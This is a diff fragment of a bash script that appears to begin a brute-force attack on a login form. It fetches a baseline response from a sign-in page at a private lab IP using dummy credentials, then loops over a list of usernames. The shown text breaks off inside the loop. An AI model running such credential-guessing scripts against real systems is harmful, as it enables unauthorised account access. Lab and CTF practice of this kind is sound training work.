@@ -1,5 +1,4 @@
 #!/bin/bash
-
 curl -s "http://192.168.1.175/?page=signin&username=qsdqsd&password=qsd&Login=Login#" > trueone
 while IFS='' read -r user; do
 		echo "try user : $user"
